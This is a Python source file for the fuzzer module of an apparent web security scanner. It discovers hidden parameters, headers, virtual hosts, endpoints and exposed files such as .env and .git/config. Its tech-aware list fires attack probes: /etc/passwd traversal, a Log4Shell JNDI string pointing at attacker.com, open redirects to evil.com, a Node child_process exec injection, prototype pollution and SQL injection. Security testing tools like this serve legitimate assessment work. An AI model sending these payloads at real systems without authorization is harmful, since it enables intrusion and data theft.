#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - Fuzzer Module
Parameter, header, HTTP method, and virtual host fuzzing

Integrates wordlists and payloads directly from the best GitHub
security repositories (SecLists, PayloadsAllTheThings, fuzzdb,
dirsearch) via the ``utils.github_wordlists`` fetcher — no external
tool installation required.
"""

import json
import os
import re
import shutil
import subprocess
import tempfile
from urllib.parse import urlparse, urljoin, urlencode, parse_qs

from config import Colors, Payloads


class FuzzerModule:
    """Fuzzer Module for parameter, header, method, and vhost enumeration.

    Combines built-in parameter lists with curated payloads from top
    GitHub security repositories (Payloads.FUZZER_EXTRA_PARAMS) and
    optionally fetches live wordlists via ``utils.github_wordlists``.
    """
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "Fuzzer"
        
        self.common_params = [
            # Original params
            'id', 'user', 'username', 'email', 'token', 'page', 'search',
            'query', 'q', 'file', 'path', 'url', 'redirect', 'next',
            'callback', 'cmd', 'exec', 'action', 'type', 'sort', 'order',
            'limit', 'offset', 'format', 'lang', 'debug', 'test', 'admin',
            'key', 'api_key', 'secret', 'password', 'pass', 'auth',
            # Authentication
            'access_token', 'apikey', 'authorization', 'bearer',
            'client_id', 'client_secret', 'oauth_token', 'session', 'sid', 'jwt',
            # File/Path
            'filename', 'filepath', 'directory', 'doc', 'document',
            'download', 'upload', 'image', 'img', 'pic', 'photo', 'attachment',
            # Network/URL
            'host', 'domain', 'proxy', 'server', 'endpoint', 'origin',
            'source', 'target', 'dest', 'destination', 'uri', 'href', 'link', 'site',
            # Database
            'table', 'column', 'field', 'db', 'database', 'schema',
            'collection', 'index', 'where', 'filter', 'group', 'having',
            # User/Profile
            'uid', 'userid', 'user_id', 'account', 'profile', 'role',
            'group_id', 'member', 'name', 'first_name', 'last_name', 'phone', 'address',
            # Application
            'app', 'module', 'controller', 'method', 'function', 'class',
            'handler', 'view', 'template', 'theme', 'skin', 'layout', 'style', 'mode',
            # Pagination/Display
            'size', 'count', 'start', 'end', 'from', 'to', 'per_page',
            'max', 'min', 'total', 'skip', 'take', 'cursor', 'after', 'before',
            # Debug/Config
            'verbose', 'trace', 'log', 'level', 'env', 'config', 'settings',
            'flag', 'feature', 'toggle', 'enable', 'disable', 'hidden', 'internal', 'private',
            # Content
            'content', 'body', 'text', 'html', 'xml', 'json', 'data',
            'payload', 'raw', 'output', 'response', 'result', 'return',
            'status', 'code', 'error', 'message',
            # Injection targets
            'include', 'require', 'load', 'read', 'write', 'render',
            'process', 'execute', 'eval', 'run', 'system', 'shell',
            'ping', 'nslookup', 'dig', 'curl', 'wget',
        ]

        # Merge curated GitHub-sourced extra params (no duplicates)
        _existing = set(self.common_params)
        for p in Payloads.FUZZER_EXTRA_PARAMS:
            if p not in _existing:
                self.common_params.append(p)
                _existing.add(p)
        
        self.fuzz_headers = [
            'X-Forwarded-For', 'X-Real-IP', 'X-Originating-IP',
            'X-Remote-IP', 'X-Remote-Addr', 'X-Custom-IP-Authorization',
            'X-Original-URL', 'X-Rewrite-URL', 'X-Host',
            'X-Forwarded-Host', 'X-Debug', 'X-Debug-Mode',
            'X-Forwarded-Proto', 'X-Forwarded-Port',
            'X-Cluster-Client-IP', 'True-Client-IP',
            'CF-Connecting-IP', 'Fastly-Client-IP', 'X-Azure-ClientIP',
        ]
        
        self.http_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE', 'HEAD']
    
    def test(self, url, method, param, value):
        """Test parameter with fuzzing"""
        pass  # Fuzzing is URL-based
    
    def test_url(self, url):
        """Run fuzzing tests on URL"""
        self._fuzz_parameters(url)
        self._fuzz_headers(url)
        self._fuzz_methods(url)
        self._fuzz_vhosts(url)
        self._fuzz_content_types(url)
        self._fuzz_path_traversal_endpoints(url)
        
        # Technology-aware smart fuzzing
        self._fuzz_tech_aware(url)
        
        # Response anomaly detection
        self._fuzz_anomaly_detect(url)

        # External tool integrations
        self._paramspider_discover(url)
        self._ffufai_fuzz(url)

        # GitHub-sourced endpoint & param discovery (native, no install)
        self._github_endpoint_discover(url)
        self._github_param_discover(url)

    # ------------------------------------------------------------------
    # Discovery-phase entry point
    # ------------------------------------------------------------------

    def discover(self, url):
        """Run endpoint & parameter discovery fuzzing (discovery phase).

        Unlike ``test_url`` which reports vulnerability findings, this
        method focuses solely on discovering new endpoints and hidden
        parameters to feed into subsequent pipeline phases.

        Args:
            url: The target URL to fuzz for hidden endpoints and
                parameters.  When an origin IP has been resolved, this
                should point at the origin server.

        Returns:
            dict: A dictionary with the following keys:
                - ``urls`` (set[str]):  Discovered endpoint URLs.
                - ``parameters`` (list[tuple]): Discovered parameters as
                  ``(url, method, name, value, source)`` tuples.
        """
        discovered_urls: set = set()
        discovered_params: list = []

        # --- Parameter discovery (silent – no findings emitted) ----------
        try:
            baseline = self.requester.request(url, 'GET')
            baseline_len = len(baseline.text) if baseline else 0
            baseline_status = baseline.status_code if baseline else 0
        except Exception:
            baseline = None
            baseline_len = 0
            baseline_status = 0

        for param_name in self.common_params:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{param_name}=test123"
                response = self.requester.request(test_url, 'GET')
                if not response:
                    continue
                if (response.status_code != baseline_status
                        or abs(len(response.text) - baseline_len) > 50):
                    discovered_params.append(
                        (url, 'get', param_name, 'test123', 'fuzzer'))
            except Exception:
                continue

        # --- ffuf / ffufai endpoint discovery (silent) -------------------
        ffuf_endpoints = self._ffuf_discover_endpoints(url)
        discovered_urls.update(ffuf_endpoints)

        # --- ParamSpider native parameter mining -------------------------
        spider_params = self._discover_archive_params(url)
        for pname in spider_params:
            discovered_params.append((url, 'get', pname, '', 'fuzzer_archive'))

        # --- GitHub wordlist-powered endpoint discovery (native) ---------
        gh_endpoints = self._github_endpoint_discover(url, silent=True)
        discovered_urls.update(gh_endpoints)

        # --- GitHub wordlist-powered param discovery (native) ------------
        gh_params = self._github_param_discover(url, silent=True)
        for pname in gh_params:
            discovered_params.append((url, 'get', pname, '', 'fuzzer_github'))

        return {
            'urls': discovered_urls,
            'parameters': discovered_params,
        }

    def _ffuf_discover_endpoints(self, url, timeout=120):
        """Run ffuf for endpoint discovery only (no findings).

        Returns:
            set[str]: Discovered endpoint URLs.
        """
        if not shutil.which('ffuf'):
            return set()

        wordlist = self._load_seclists_wordlist('common.txt')
        endpoints: set = set()
        wordlist_fd = None
        output_fd = None
        wordlist_file = ''
        output_file = ''

        try:
            wordlist_fd, wordlist_file = tempfile.mkstemp(
                prefix='fuzzer_disc_wl_', suffix='.txt')
            output_fd, output_file = tempfile.mkstemp(
                prefix='fuzzer_disc_out_', suffix='.json')
            # Close the fd for the output file so ffuf can write to it
            os.close(output_fd)
            output_fd = None

            with os.fdopen(wordlist_fd, 'w') as fh:
                fh.write('\n'.join(wordlist))
            wordlist_fd = None  # fd closed by fdopen

            parsed = urlparse(url)
            fuzz_url = f"{parsed.scheme}://{parsed.netloc}/FUZZ"

            cmd = [
                'ffuf', '-u', fuzz_url, '-w', wordlist_file,
                '-o', output_file, '-of', 'json',
                '-mc', '200,201,204,301,302,307,401,403',
                '-t', '10', '-s',
            ]

            try:
                subprocess.run(cmd, capture_output=True, text=True,
                               timeout=timeout)
            except (subprocess.TimeoutExpired, Exception):
                return endpoints

            if os.path.isfile(output_file):
                try:
                    with open(output_file, 'r') as fh:
                        data = json.load(fh)
                    for result in data.get('results', []):
                        ep_url = result.get('url', '')
                        if ep_url:
                            endpoints.add(ep_url)
                except (json.JSONDecodeError, KeyError):
                    pass
        except Exception:
            pass
        finally:
            for path in (wordlist_file, output_file):
                try:
                    os.remove(path)
                except OSError:
                    pass

        return endpoints

    def _discover_archive_params(self, url):
        """Mine parameter names from web archives (no findings).

        Returns:
            set[str]: Discovered parameter names.
        """
        parsed = urlparse(url)
        domain = parsed.hostname
        if not domain:
            return set()
        return self._paramspider_native(domain)
    
    def _fuzz_parameters(self, url):
        """Fuzz for hidden parameters"""
        discovered = []
        try:
            baseline = self.requester.request(url, 'GET')
            baseline_len = len(baseline.text) if baseline else 0
            baseline_status = baseline.status_code if baseline else 0
        except Exception:
            return
        
        for param_name in self.common_params:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{param_name}=test123"
                response = self.requester.request(test_url, 'GET')
                if not response:
                    continue
                if response.status_code != baseline_status or abs(len(response.text) - baseline_len) > 50:
                    discovered.append(param_name)
            except Exception:
                continue
        
        if discovered:
            from core.engine import Finding
            finding = Finding(
                technique="Fuzzer (Hidden Parameters)",
                url=url, severity='LOW', confidence=0.5,
                param='N/A', payload=', '.join(discovered),
                evidence=f"Found {len(discovered)} potentially hidden parameters: {', '.join(discovered[:10])}",
            )
            self.engine.add_finding(finding)
    
    def _fuzz_headers(self, url):
        """Fuzz custom headers for hidden behavior"""
        discovered = []
        try:
            baseline = self.requester.request(url, 'GET')
            baseline_len = len(baseline.text) if baseline else 0
            baseline_status = baseline.status_code if baseline else 0
        except Exception:
            return
        
        for header_name in self.fuzz_headers:
            try:
                test_values = [
                    # IP spoofing values
                    '127.0.0.1', '10.0.0.1', '192.168.1.1', '::1', '0.0.0.0',
                    # Original values
                    'localhost', 'admin', 'true', '1',
                    # Path override values
                    '/admin', '/debug', '/internal', '/api/debug', '/',
                ]
                for test_val in test_values:
                    response = self.requester.request(url, 'GET', headers={header_name: test_val})
                    if not response:
                        continue
                    if response.status_code != baseline_status or abs(len(response.text) - baseline_len) > 100:
                        discovered.append(f"{header_name}: {test_val}")
                        break
            except Exception:
                continue
        
        if discovered:
            from core.engine import Finding
            finding = Finding(
                technique="Fuzzer (Header Fuzzing)",
                url=url, severity='MEDIUM', confidence=0.5,
                param='N/A', payload='; '.join(discovered[:5]),
                evidence=f"Found {len(discovered)} headers affecting response: {'; '.join(discovered[:5])}",
            )
            self.engine.add_finding(finding)
    
    def _fuzz_methods(self, url):
        """Fuzz HTTP methods"""
        allowed_methods = []
        dangerous_methods = []
        
        for http_method in self.http_methods:
            try:
                response = self.requester.request(url, http_method)
                if not response:
                    continue
                if response.status_code not in (405, 501):
                    allowed_methods.append(http_method)
                    if http_method in ('PUT', 'DELETE', 'TRACE', 'PATCH'):
                        dangerous_methods.append(http_method)
            except Exception:
                continue
        
        if dangerous_methods:
            from core.engine import Finding
            finding = Finding(
                technique="Fuzzer (HTTP Method Fuzzing)",
                url=url, severity='MEDIUM', confidence=0.7,
                param='N/A', payload=', '.join(dangerous_methods),
                evidence=f"Dangerous HTTP methods allowed: {', '.join(dangerous_methods)}. All allowed: {', '.join(allowed_methods)}",
            )
            self.engine.add_finding(finding)
    
    def _fuzz_vhosts(self, url):
        """Fuzz virtual hosts via Host header"""
        parsed = urlparse(url)
        domain = parsed.hostname
        if not domain:
            return
        
        vhost_prefixes = [
            'admin', 'dev', 'staging', 'test', 'internal', 'api',
            'beta', 'debug', 'old', 'new', 'backup', 'secret',
            'stage', 'uat', 'qa', 'ci', 'cd', 'pre', 'preprod',
            'demo', 'sandbox', 'local', 'intranet', 'vpn', 'proxy',
            'gateway', 'ws', 'websocket', 'grpc', 'graphql',
            'mail', 'smtp', 'ftp', 'cdn', 'static', 'assets',
            'media', 'upload', 'storage', 's3', 'minio',
        ]
        
        discovered = []
        try:
            baseline = self.requester.request(url, 'GET')
            baseline_len = len(baseline.text) if baseline else 0
        except Exception:
            return
        
        for prefix in vhost_prefixes:
            try:
                vhost = f"{prefix}.{domain}"
                response = self.requester.request(url, 'GET', headers={'Host': vhost})
                if not response:
                    continue
                resp_len = len(response.text)
                if resp_len > 0 and abs(resp_len - baseline_len) > 100 and response.status_code != 404:
                    discovered.append(vhost)
            except Exception:
                continue
        
        if discovered:
            from core.engine import Finding
            finding = Finding(
                technique="Fuzzer (Virtual Host Enumeration)",
                url=url, severity='MEDIUM', confidence=0.6,
                param='Host', payload=', '.join(discovered[:5]),
                evidence=f"Found {len(discovered)} potential virtual hosts: {', '.join(discovered[:5])}",
            )
            self.engine.add_finding(finding)
    
    def _fuzz_content_types(self, url):
        """Test URL with different content types to find hidden API behaviors"""
        content_types = [
            'application/json',
            'application/xml',
            'application/x-www-form-urlencoded',
            'multipart/form-data',
            'text/plain',
            'text/xml',
        ]
        
        discovered = []
        try:
            baseline = self.requester.request(url, 'GET')
            baseline_len = len(baseline.text) if baseline else 0
            baseline_status = baseline.status_code if baseline else 0
        except Exception:
            return
        
        for ctype in content_types:
            try:
                response = self.requester.request(
                    url, 'POST', headers={'Content-Type': ctype}, data='')
                if not response:
                    continue
                resp_len = len(response.text)
                if (response.status_code != baseline_status
                        or abs(resp_len - baseline_len) > 100):
                    discovered.append(
                        f"{ctype} [{response.status_code}] [{resp_len}B]")
            except Exception:
                continue
        
        if discovered:
            from core.engine import Finding
            finding = Finding(
                technique="Fuzzer (Content-Type Fuzzing)",
                url=url, severity='LOW', confidence=0.5,
                param='Content-Type', payload='; '.join(discovered[:5]),
                evidence=f"Found {len(discovered)} content types with different responses: {'; '.join(discovered[:5])}",
            )
            self.engine.add_finding(finding)
    
    def _fuzz_path_traversal_endpoints(self, url):
        """Test common backup/config file locations for sensitive file exposure"""
        sensitive_paths = [
            '.env', '.git/config', '.svn/entries',
            'backup.sql', 'dump.sql', 'config.php.bak',
            'web.config.bak', '.DS_Store', '.htpasswd',
            'wp-config.php', 'package.json', 'composer.json',
            'Gemfile', 'Dockerfile', 'docker-compose.yml',
        ]
        
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}/"
        
        discovered = []
        for spath in sensitive_paths:
            try:
                test_url = urljoin(base_url, spath)
                response = self.requester.request(test_url, 'GET')
                if not response:
                    continue
                if response.status_code == 200 and len(response.text) > 0:
                    discovered.append(
                        f"{spath} [{response.status_code}] [{len(response.text)}B]")
            except Exception:
                continue
        
        if discovered:
            from core.engine import Finding
            finding = Finding(
                technique="Fuzzer (Sensitive File Discovery)",
                url=url, severity='HIGH', confidence=0.7,
                param='N/A', payload='; '.join(discovered[:10]),
                evidence=f"Found {len(discovered)} exposed sensitive files: {'; '.join(discovered[:10])}",
            )
            self.engine.add_finding(finding)
    
    def _load_seclists_wordlist(self, wordlist_name='common.txt'):
        """Load a wordlist from SecLists installation or fall back to built-in list.
        
        Checks common SecLists installation paths and loads the requested
        wordlist from the Discovery/Web-Content/ directory. Returns a
        built-in default wordlist when SecLists is not available.
        
        Args:
            wordlist_name: Filename of the wordlist to load from
                Discovery/Web-Content/ (default: 'common.txt').
        
        Returns:
            list[str]: Lines from the wordlist file, or a built-in
            fallback list if SecLists is not found.
        """
        seclists_paths = [
            '/usr/share/seclists',
            os.path.expanduser('~/SecLists'),
            os.path.join(os.getcwd(), 'SecLists'),
        ]
        
        for base_path in seclists_paths:
            wordlist_path = os.path.join(
                base_path, 'Discovery', 'Web-Content', wordlist_name,
            )
            if os.path.isfile(wordlist_path):
                try:
                    with open(wordlist_path, 'r', errors='ignore') as fh:
                        lines = [
                            line.strip() for line in fh
                            if line.strip() and not line.startswith('#')
                        ]
                    return lines
                except Exception:
                    continue
        
        # ── GitHub raw fetcher (SecLists via HTTPS, no install) ──
        _SECLISTS_MAP = {
            'common.txt': 'seclists_common',
            'big.txt': 'seclists_big',
        }
        wl_key = _SECLISTS_MAP.get(wordlist_name)
        if wl_key:
            try:
                from utils.github_wordlists import fetch_wordlist
                lines = fetch_wordlist(wl_key, max_lines=5000)
                if lines:
                    return lines
            except Exception:
                pass

        # Built-in fallback wordlist
        return [
            'admin', 'login', 'dashboard', 'api', 'config', 'backup',
            'test', 'dev', 'staging', 'debug', 'console', 'manager',
            'portal', 'wp-admin', 'wp-login.php', 'administrator',
            'phpmyadmin', 'server-status', 'server-info', '.env',
            '.git', 'robots.txt', 'sitemap.xml', 'swagger', 'graphql',
            'api/v1', 'api/v2', 'health', 'status', 'info', 'metrics',
            'actuator', 'trace', 'env', '.well-known', 'favicon.ico',
            'crossdomain.xml', 'security.txt', '.htaccess', 'web.config',
        ]
    
    def _ffuf_fuzz(self, url, timeout=120):
        """Run ffuf for high-speed web fuzzing of the target URL.
        
        Executes ffuf as a subprocess to discover hidden endpoints and
        parameters. Parses the JSON output for any results found.
        Falls back gracefully when ffuf is not installed.
        
        Args:
            url: Target URL to fuzz.
            timeout: Maximum seconds to allow ffuf to run (default: 120).
        """
        if not shutil.which('ffuf'):
            return
        
        wordlist = self._load_seclists_wordlist('common.txt')
        
        # Write wordlist to a temporary file in the working directory
        wordlist_file = os.path.join(os.getcwd(), '.fuzzer_ffuf_wordlist.txt')
        output_file = os.path.join(os.getcwd(), '.fuzzer_ffuf_output.json')
        
        try:
            with open(wordlist_file, 'w') as fh:
                fh.write('\n'.join(wordlist))
            
            parsed = urlparse(url)
            fuzz_url = f"{parsed.scheme}://{parsed.netloc}/FUZZ"
            
            cmd = [
                'ffuf',
                '-u', fuzz_url,
                '-w', wordlist_file,
                '-o', output_file,
                '-of', 'json',
                '-mc', '200,201,204,301,302,307,401,403',
                '-t', '10',
                '-s',
            ]
            
            try:
                subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                )
            except subprocess.TimeoutExpired:
                return
            except Exception:
                return
            
            discovered = []
            if os.path.isfile(output_file):
                try:
                    with open(output_file, 'r') as fh:
                        data = json.load(fh)
                    results = data.get('results', [])
                    for result in results:
                        entry_url = result.get('url', '')
                        status = result.get('status', 0)
                        length = result.get('length', 0)
                        discovered.append(
                            f"{entry_url} [{status}] [{length}B]"
                        )
                except (json.JSONDecodeError, KeyError):
                    pass
            
            if discovered:
                from core.engine import Finding
                finding = Finding(
                    technique="Fuzzer (ffuf Discovery)",
                    url=url, severity='MEDIUM', confidence=0.7,
                    param='N/A', payload=', '.join(discovered[:10]),
                    evidence=f"ffuf discovered {len(discovered)} endpoints: {'; '.join(discovered[:5])}",
                )
                self.engine.add_finding(finding)
        
        except Exception:
            return
        
        finally:
            for path in (wordlist_file, output_file):
                try:
                    os.remove(path)
                except OSError:
                    pass
    
    def _ffufai_fuzz(self, url, timeout=180):
        """Run ffufai for AI-powered web fuzzing of the target URL.
        
        Executes ffufai as a subprocess, which uses AI to generate
        intelligent wordlists for fuzzing. Falls back to regular ffuf
        if ffufai is not available.
        
        Args:
            url: Target URL to fuzz.
            timeout: Maximum seconds to allow ffufai to run (default: 180).
        """
        if not shutil.which('ffufai'):
            self._ffuf_fuzz(url, timeout=timeout)
            return
        
        parsed = urlparse(url)
        fuzz_url = f"{parsed.scheme}://{parsed.netloc}/FUZZ"
        output_file = os.path.join(os.getcwd(), '.fuzzer_ffufai_output.json')
        
        try:
            cmd = [
                'ffufai',
                '-u', fuzz_url,
                '-o', output_file,
                '-of', 'json',
                '-mc', '200,201,204,301,302,307,401,403',
            ]
            
            try:
                subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                )
            except subprocess.TimeoutExpired:
                return
            except Exception:
                return
            
            discovered = []
            if os.path.isfile(output_file):
                try:
                    with open(output_file, 'r') as fh:
                        data = json.load(fh)
                    results = data.get('results', [])
                    for result in results:
                        entry_url = result.get('url', '')
                        status = result.get('status', 0)
                        length = result.get('length', 0)
                        discovered.append(
                            f"{entry_url} [{status}] [{length}B]"
                        )
                except (json.JSONDecodeError, KeyError):
                    pass
            
            if discovered:
                from core.engine import Finding
                finding = Finding(
                    technique="Fuzzer (ffufai AI Discovery)",
                    url=url, severity='MEDIUM', confidence=0.7,
                    param='N/A', payload=', '.join(discovered[:10]),
                    evidence=f"ffufai discovered {len(discovered)} endpoints: {'; '.join(discovered[:5])}",
                )
                self.engine.add_finding(finding)
        
        except Exception:
            return
        
        finally:
            try:
                os.remove(output_file)
            except OSError:
                pass

    # ------------------------------------------------------------------
    # Technology-Aware Smart Fuzzing
    # ------------------------------------------------------------------

    def _fuzz_tech_aware(self, url):
        """Select fuzzing payloads based on detected technology stack."""
        # Get detected technologies from engine context
        detected_tech = set()
        if hasattr(self.engine, 'context') and hasattr(self.engine.context, 'detected_tech'):
            detected_tech = self.engine.context.detected_tech

        tech_payloads = {
            'PHP': [
                ('file', '../../../../etc/passwd', 'LFI'),
                ('page', 'php://filter/convert.base64-encode/resource=index', 'PHP Wrapper'),
                ('cmd', ';phpinfo()', 'PHP Code Injection'),
                ('debug', 'true', 'Debug Mode'),
            ],
            'Java': [
                ('cmd', '${jndi:ldap://attacker.com/a}', 'Log4Shell'),
                ('path', '..;/WEB-INF/web.xml', 'Java Path Traversal'),
                ('redirect', 'https://evil.com', 'Open Redirect'),
            ],
            'ASP.NET': [
                ('path', '..\\web.config', 'IIS Path Traversal'),
                ('__VIEWSTATE', 'AAAA', 'ViewState Manipulation'),
                ('redirect', 'https://evil.com', 'Open Redirect'),
            ],
            'Node.js': [
                ('__proto__[isAdmin]', 'true', 'Prototype Pollution'),
                ('constructor[prototype][isAdmin]', 'true', 'Prototype Pollution'),
                ('cmd', 'require("child_process").exec("id")', 'SSTI/RCE'),
            ],
            'WordPress': [
                ('action', 'heartbeat', 'WP Action Probe'),
                ('rest_route', '/wp/v2/users', 'WP User Enum'),
                ('wp_customize', 'on', 'WP Customizer'),
            ],
            'Django': [
                ('__class__', 'test', 'SSTI Probe'),
                ('admin', 'true', 'Admin Bypass'),
                ('debug', 'true', 'Django Debug'),
            ],
            'Laravel': [
                ('_method', 'PUT', 'Method Override'),
                ('_token', 'bypass', 'CSRF Bypass'),
                ('APP_KEY', 'test', 'Config Leak'),
            ],
        }

        tested = 0
        try:
            baseline = self.requester.request(url, 'GET')
            baseline_text = baseline.text if baseline else ''
            baseline_len = len(baseline_text)
            baseline_status = baseline.status_code if baseline else 0
        except Exception:
            return

        for tech_name, payloads in tech_payloads.items():
            # Test if this tech is detected, or test anyway for common ones
            if detected_tech and tech_name not in detected_tech:
                # Still test generic payloads for undetected frameworks
                if tech_name not in ('PHP', 'Java', 'Node.js'):
                    continue

            for param, value, desc in payloads:
                try:
                    test_url = f"{url}{'&' if '?' in url else '?'}{param}={value}"
                    resp = self.requester.request(test_url, 'GET')
                    if not resp:
                        continue
                    tested += 1

                    # Detect anomalies
                    if self._is_anomalous(resp, baseline_status, baseline_len, baseline_text):
                        from core.engine import Finding
                        finding = Finding(
                            technique=f"Fuzzer (Tech-Aware: {desc})",
                            url=url, method='GET', param=param,
                            payload=value,
                            evidence=f"Tech: {tech_name}, Status: {resp.status_code}, "
                                     f"Length delta: {abs(len(resp.text) - baseline_len)}",
                            severity='MEDIUM', confidence=0.6,
                        )
                        self.engine.add_finding(finding)
                except Exception:
                    continue

        if self.engine.config.get('verbose') and tested > 0:
            print(f"{Colors.info(f'Tech-aware fuzzing: {tested} payloads tested')}")

    # ------------------------------------------------------------------
    # Response Anomaly Detection
    # ------------------------------------------------------------------

    def _fuzz_anomaly_detect(self, url):
        """Send boundary/edge-case values and detect response anomalies."""
        anomaly_payloads = [
            ('id', '-1', 'Negative ID'),
            ('id', '0', 'Zero ID'),
            ('id', '99999999', 'Large ID'),
            ('id', "1' OR '1'='1", 'SQLi Probe'),
            ('page', '-1', 'Negative Page'),
            ('limit', '99999', 'Large Limit'),
            ('offset', '-1', 'Negative Offset'),
            ('format', 'xml', 'Format Switch'),
            ('format', 'json', 'Format Switch'),
            ('callback', 'test', 'JSONP Probe'),
            ('_debug', '1', 'Debug Flag'),
            ('_internal', '1', 'Internal Flag'),
            ('test', 'true', 'Test Mode'),
            ('admin', '1', 'Admin Flag'),
            ('role', 'admin', 'Role Escalation'),
            ('price', '-1', 'Negative Price'),
            ('quantity', '0', 'Zero Quantity'),
            ('discount', '100', 'Full Discount'),
        ]

        try:
            baseline = self.requester.request(url, 'GET')
            if not baseline:
                return
            baseline_text = baseline.text
            baseline_len = len(baseline_text)
            baseline_status = baseline.status_code
        except Exception:
            return

        for param, value, desc in anomaly_payloads:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{param}={value}"
                resp = self.requester.request(test_url, 'GET')
                if not resp:
                    continue

                if self._is_anomalous(resp, baseline_status, baseline_len, baseline_text):
                    from core.engine import Finding
                    finding = Finding(
                        technique=f"Fuzzer (Anomaly: {desc})",
                        url=url, method='GET', param=param,
                        payload=value,
                        evidence=f"Status: {resp.status_code} (baseline: {baseline_status}), "
                                 f"Length: {len(resp.text)} (baseline: {baseline_len}), "
                                 f"Body diff detected",
                        severity='LOW', confidence=0.5,
                    )
                    self.engine.add_finding(finding)
            except Exception:
                continue

    @staticmethod
    def _is_anomalous(resp, baseline_status, baseline_len, baseline_text):
        """Check if a response is anomalous compared to baseline."""
        if not resp:
            return False

        # Status code change
        if resp.status_code != baseline_status:
            # Don't flag simple 404s or redirects as anomalies
            if resp.status_code not in (404, 301, 302, 304):
                return True

        # Significant size difference
        resp_len = len(resp.text) if resp.text else 0
        if baseline_len > 0:
            size_ratio = abs(resp_len - baseline_len) / max(baseline_len, 1)
            if size_ratio > 0.5 and abs(resp_len - baseline_len) > 200:
                return True

        # Error pattern detection
        error_patterns = [
            'syntax error', 'unexpected', 'exception', 'traceback',
            'stack trace', 'fatal error', 'warning:', 'mysql_',
            'pg_query', 'ora-', 'sql', 'database error',
            'internal server error', 'debug',
        ]
        resp_text = (resp.text or '').lower()[:3000]
        baseline_lower = baseline_text.lower()[:3000] if baseline_text else ''
        for pattern in error_patterns:
            if pattern in resp_text and pattern not in baseline_lower:
                return True

        return False
    
    def _paramspider_discover(self, url):
        """Discover parameters using ParamSpider or native web archive fallback.
        
        Attempts to run ParamSpider as a subprocess to discover URL
        parameters for the target domain. If ParamSpider is not installed,
        falls back to a native Python implementation that queries the
        Wayback Machine (web.archive.org) for archived URLs containing
        query parameters.
        
        Discovered parameters are added to ``self.common_params`` for
        use by subsequent fuzzing methods.
        
        Args:
            url: Target URL whose domain will be searched for parameters.
        """
        parsed = urlparse(url)
        domain = parsed.hostname
        if not domain:
            return
        
        discovered_params = set()
        
        if shutil.which('paramspider'):
            discovered_params = self._paramspider_cli(domain)
        else:
            discovered_params = self._paramspider_native(domain)
        
        if discovered_params:
            new_params = [
                p for p in discovered_params if p not in self.common_params
            ]
            self.common_params.extend(new_params)
            
            from core.engine import Finding
            finding = Finding(
                technique="Fuzzer (ParamSpider Discovery)",
                url=url, severity='INFO', confidence=0.6,
                param='N/A', payload=', '.join(sorted(discovered_params)[:20]),
                evidence=f"Discovered {len(discovered_params)} parameters via archive analysis: {', '.join(sorted(discovered_params)[:10])}",
            )
            self.engine.add_finding(finding)
    
    def _paramspider_cli(self, domain):
        """Run ParamSpider CLI to discover parameters for a domain.
        
        Args:
            domain: Target domain to scan.
        
        Returns:
            set[str]: Set of discovered parameter names.
        """
        discovered_params = set()
        output_dir = os.path.join(os.getcwd(), '.paramspider_output')
        
        try:
            cmd = [
                'paramspider',
                '-d', domain,
                '--output', output_dir,
            ]
            
            try:
                subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=120,
                )
            except (subprocess.TimeoutExpired, Exception):
                return discovered_params
            
            output_file = os.path.join(output_dir, f"{domain}.txt")
            if os.path.isfile(output_file):
                try:
                    with open(output_file, 'r', errors='ignore') as fh:
                        for line in fh:
                            line = line.strip()
                            if not line:
                                continue
                            try:
                                qs = urlparse(line).query
                                for param_name in parse_qs(qs).keys():
                                    if param_name and len(param_name) < 50:
                                        discovered_params.add(param_name)
                            except Exception:
                                continue
                except Exception:
                    pass
        
        except Exception:
            pass
        
        finally:
            try:
                if os.path.isdir(output_dir):
                    for fname in os.listdir(output_dir):
                        os.remove(os.path.join(output_dir, fname))
                    os.rmdir(output_dir)
            except OSError:
                pass
        
        return discovered_params
    
    def _paramspider_native(self, domain):
        """Native fallback for parameter discovery via web archive APIs.
        
        Queries the Wayback Machine CDX API for archived URLs belonging
        to the target domain and extracts unique query parameter names.
        
        Args:
            domain: Target domain to search in web archives.
        
        Returns:
            set[str]: Set of discovered parameter names.
        """
        discovered_params = set()
        
        archive_url = (
            f"https://web.archive.org/cdx/search/cdx"
            f"?url={domain}/*&output=text&fl=original"
            f"&filter=urlkey:.*\\?.*&collapse=urlkey&limit=500"
        )
        
        try:
            response = self.requester.request(archive_url, 'GET')
            if not response or response.status_code != 200:
                return discovered_params
            
            for line in response.text.splitlines():
                line = line.strip()
                if not line or '?' not in line:
                    continue
                try:
                    qs = urlparse(line).query
                    for param_name in parse_qs(qs).keys():
                        if param_name and len(param_name) < 50:
                            discovered_params.add(param_name)
                except Exception:
                    continue
        
        except Exception:
            pass
        
        return discovered_params

    # ------------------------------------------------------------------
    # GitHub repository-powered discovery (no external tool required)
    # ------------------------------------------------------------------

    def _github_endpoint_discover(self, url, *, silent=False):
        """Discover endpoints using wordlists fetched from GitHub repos.

        Fetches curated content-discovery wordlists from SecLists,
        dirsearch, and the framework's own ``Payloads.DISCOVERY_PATHS_EXTENDED``
        via ``utils.github_wordlists``, then probes the target for each
        path.  No external tool installation is required.

        Args:
            url: Target URL.
            silent: If *True*, return discovered URLs without emitting
                findings (used in the discovery pipeline phase).

        Returns:
            set[str]: Discovered endpoint URLs (always returned; findings
            are only emitted when *silent* is False).
        """
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        discovered = set()

        # Collect paths: start with built-in extended paths
        paths = list(Payloads.DISCOVERY_PATHS_EXTENDED)

        # Merge API endpoint patterns
        for ep in Payloads.API_ENDPOINT_PATTERNS:
            if ep not in paths:
                paths.append(ep)

        # Fetch live SecLists common wordlist (up to 500 entries)
        try:
            from utils.github_wordlists import fetch_wordlist
            gh_common = fetch_wordlist('seclists_common', max_lines=500)
            _existing = set(paths)
            for p in gh_common:
                if p.startswith('/') or p.startswith('.'):
                    entry = p if p.startswith('/') else f'/{p}'
                else:
                    entry = f'/{p}'
                if entry not in _existing:
                    paths.append(entry)
